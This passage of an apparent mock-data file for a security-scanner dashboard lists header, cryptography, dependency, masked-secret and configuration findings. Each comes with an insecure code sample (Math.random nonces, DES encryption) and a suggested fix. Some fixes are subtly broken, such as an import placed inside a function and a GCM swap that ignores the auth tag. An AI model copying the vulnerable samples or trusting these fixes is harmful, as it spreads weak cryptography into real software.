    description: 'Absence of the `nosniff` header allows older browsers to MIME-sniff responses away from the declared content-type, potentially executing uploaded text files as JavaScript.',
    attackScenario: 'A user uploads a `.txt` file containing HTML/JavaScript. If served without nosniff, certain browsers interpret the file as executable script.',
    aiFix: {
      before: `res.setHeader('X-Frame-Options', 'DENY');`,
      after: `res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('X-Content-Type-Options', 'nosniff');`,
      explanation: 'Added X-Content-Type-Options: nosniff header to HTTP response pipeline.'
    },
    effortHours: 0.25,
    pointsGainedIfFixed: 0.5,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 23. Missing HSTS header (Low)
  {
    id: 'f-023',
    scanId: 'scan_exp_8892',
    title: 'Missing HTTP Strict Transport Security (HSTS) header',
    severity: 'Low',
    category: 'Security Misconfiguration',
    cwe: 'CWE-523',
    owasp: 'A05:2021',
    filePath: 'server/middleware/security.js',
    lineStart: 20,
    lineEnd: 24,
    codeSnippet: `// Missing Strict-Transport-Security header declaration
res.removeHeader('X-Powered-By');`,
    description: 'Without HSTS, the initial connection between a user browser and the web server may occur over unencrypted HTTP before being redirected to HTTPS, leaving a window for SSL-stripping attacks.',
    attackScenario: 'An attacker on public Wi-Fi intercepts the unencrypted initial HTTP request and proxies communication without HTTPS.',
    aiFix: {
      before: `res.removeHeader('X-Powered-By');`,
      after: `res.removeHeader('X-Powered-By');\n  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');`,
      explanation: 'Configured 1-year HSTS header enforcing automatic HTTPS upgrades.'
    },
    effortHours: 0.25,
    pointsGainedIfFixed: 0.5,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 24. Server version banner disclosed (Low)
  {
    id: 'f-024',
    scanId: 'scan_exp_8892',
    title: 'Express server banner disclosed in HTTP response header',
    severity: 'Low',
    category: 'Security Misconfiguration',
    cwe: 'CWE-200',
    owasp: 'A05:2021',
    filePath: 'src/app.js',
    lineStart: 31,
    lineEnd: 35,
    codeSnippet: `const app = express();
// Default X-Powered-By: Express remains active`,
    description: 'The default `X-Powered-By: Express` header is transmitted with every HTTP response, notifying automated vulnerability scanners of the underlying technology stack.',
    attackScenario: 'Automated exploit bots filter targets specifically advertising Express to launch tailored zero-day probes.',
    aiFix: {
      before: `const app = express();`,
      after: `const app = express();\napp.disable('x-powered-by');`,
      explanation: 'Disabled Express powered-by header emission.'
    },
    effortHours: 0.25,
    pointsGainedIfFixed: 0.5,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 25. Insecure random generator Math.random (Low)
  {
    id: 'f-025',
    scanId: 'scan_exp_8892',
    title: 'Insecure pseudo-random generator used for CSRF token generation',
    severity: 'Low',
    category: 'Cryptographic Failures',
    cwe: 'CWE-330',
    owasp: 'A02:2021',
    filePath: 'src/utils/tokens.js',
    lineStart: 9,
    lineEnd: 15,
    codeSnippet: `export function generateNonce() {
  // Math.random is not cryptographically secure
  return Math.random().toString(36).substring(2, 15);
}`,
    description: '`Math.random()` relies on predictable internal PRNG states (such as xoshiro128+ in V8). Given a few consecutive outputs, attackers can predict upcoming nonce values.',
    attackScenario: 'An attacker observes previous tokens and computes future session nonces to bypass CSRF safeguards.',
    aiFix: {
      before: `return Math.random().toString(36).substring(2, 15);`,
      after: `import crypto from 'crypto';\nreturn crypto.randomBytes(16).toString('hex');`,
      explanation: 'Replaced Math.random with crypto.randomBytes for cryptographically strong entropy.'
    },
    effortHours: 0.5,
    pointsGainedIfFixed: 0.5,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 26. Deprecated crypto cipher DES (Low)
  {
    id: 'f-026',
    scanId: 'scan_exp_8892',
    title: 'Deprecated DES cipher used for legacy telemetry packet encryption',
    severity: 'Low',
    category: 'Cryptographic Failures',
    cwe: 'CWE-326',
    owasp: 'A02:2021',
    filePath: 'src/utils/cipher.js',
    lineStart: 12,
    lineEnd: 18,
    codeSnippet: `export function encryptTelemetry(data, key) {
  // 56-bit DES key size is cryptographically broken
  const cipher = crypto.createCipheriv('des-cbc', key, iv);
  return Buffer.concat([cipher.update(data), cipher.final()]);
}`,
    description: 'DES uses a 56-bit key length susceptible to total brute-force exhaustion within hours using modern consumer hardware.',
    attackScenario: 'An adversary capturing encrypted telemetry packets performs an exhaustive keyspace search to decrypt operational telemetry.',
    aiFix: {
      before: `const cipher = crypto.createCipheriv('des-cbc', key, iv);`,
      after: `const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);`,
      explanation: 'Upgraded legacy cipher algorithm to authenticated AES-256-GCM.'
    },
    effortHours: 0.5,
    pointsGainedIfFixed: 0.5,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  }
]

export const mockDependencyIssues: DependencyIssue[] = [
  {
    id: 'dep-001',
    scanId: 'scan_exp_8892',
    package: 'lodash',
    currentVersion: '4.17.20',
    fixedVersion: '4.17.21',
    cve: 'CVE-2021-23337',
    severity: 'High',
    description: 'Command injection vulnerability in lodash template method via untrusted template strings.'
  },
  {
    id: 'dep-002',
    scanId: 'scan_exp_8892',
    package: 'express',
    currentVersion: '4.17.1',
    fixedVersion: '4.18.2',
    cve: 'CVE-2022-24999',
    severity: 'High',
    description: 'Query string parsing prototype pollution and denial of service via bundled qs dependency.'
  },
  {
    id: 'dep-003',
    scanId: 'scan_exp_8892',
    package: 'jsonwebtoken',
    currentVersion: '8.5.1',
    fixedVersion: '9.0.0',
    cve: 'CVE-2022-23529',
    severity: 'Critical',
    description: 'Remote code execution via crafted key verification object passed to verify function.'
  },
  {
    id: 'dep-004',
    scanId: 'scan_exp_8892',
    package: 'axios',
    currentVersion: '0.21.1',
    fixedVersion: '0.21.4',
    cve: 'CVE-2021-3749',
    severity: 'Medium',
    description: 'Regular expression denial of service in trim function when handling long strings.'
  },
  {
    id: 'dep-005',
    scanId: 'scan_exp_8892',
    package: 'minimist',
    currentVersion: '1.2.5',
    fixedVersion: '1.2.6',
    cve: 'CVE-2021-44906',
    severity: 'High',
    description: 'Prototype pollution vulnerability in parameter argument parsing.'
  },
  {
    id: 'dep-006',
    scanId: 'scan_exp_8892',
    package: 'semver',
    currentVersion: '7.3.5',
    fixedVersion: '7.5.2',
    cve: 'CVE-2022-25883',
    severity: 'Medium',
    description: 'Regular expression denial of service via catastrophic backtracking in version comparisons.'
  }
]

export const mockSecretFindings: SecretFinding[] = [
  {
    id: 'sec-001',
    scanId: 'scan_exp_8892',
    type: 'AWS Access Key',
    filePath: 'server/config/storage.js',
    line: 8,
    maskedValue: '****************AKIA',
    severity: 'Critical',
    rotateUrl: 'https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html#Using_RotateAccessKey'
  },
  {
    id: 'sec-002',
    scanId: 'scan_exp_8892',
    type: 'Stripe secret key',
    filePath: '.env',
    line: 3,
    maskedValue: '****************4242',
    severity: 'High',
    rotateUrl: 'https://stripe.com/docs/keys#rolling-keys'
  },
  {
    id: 'sec-003',
    scanId: 'scan_exp_8892',
    type: 'SendGrid API key',
    filePath: 'src/services/email.js',
    line: 5,
    maskedValue: '****************4m9A',
    severity: 'High',
    rotateUrl: 'https://docs.sendgrid.com/ui/account-and-settings/api-keys'
  },
  {
    id: 'sec-004',
    scanId: 'scan_exp_8892',
    type: 'Hardcoded DB password',
    filePath: 'docker-compose.yml',
    line: 22,
    maskedValue: '****************89z!',
    severity: 'Critical',
    rotateUrl: 'https://docs.docker.com/compose/environment-variables/'
  }
]

export const mockConfigurationIssues: ConfigurationIssue[] = [
  {
    id: 'cfg-001',
    scanId: 'scan_exp_8892',
    issue: 'Container runs as administrative root user',
    filePath: 'Dockerfile',
    rule: 'docker-no-root',
    severity: 'High',
    status: 'Open'
  },
  {
    id: 'cfg-002',
    scanId: 'scan_exp_8892',
    issue: 'Permissive CORS configuration with origin wildcard',
    filePath: 'server/middleware/cors.ts',
    rule: 'cors-origin-wildcard',
    severity: 'Medium',
    status: 'Open'
  },
  {
    id: 'cfg-003',
    scanId: 'scan_exp_8892',
    issue: 'Missing Content-Security-Policy (CSP) headers',
    filePath: 'server/middleware/security.js',
    rule: 'security-headers-csp',
    severity: 'Low',
    status: 'Open'
  },
  {
    id: 'cfg-004',
    scanId: 'scan_exp_8892',
    issue: 'Production debug logging enabled in environment template',
    filePath: 'config/prod.env',
    rule: 'env-no-debug',
    severity: 'Low',
    status: 'Open'
  },
  {
    id: 'cfg-005',
    scanId: 'scan_exp_8892',
    issue: 'Unpinned third-party GitHub Action reference',
    filePath: '.github/workflows/ci.yml',
    rule: 'ci-pin-action-hashes',
    severity: 'Medium',
    status: 'Fixed'
  }
]
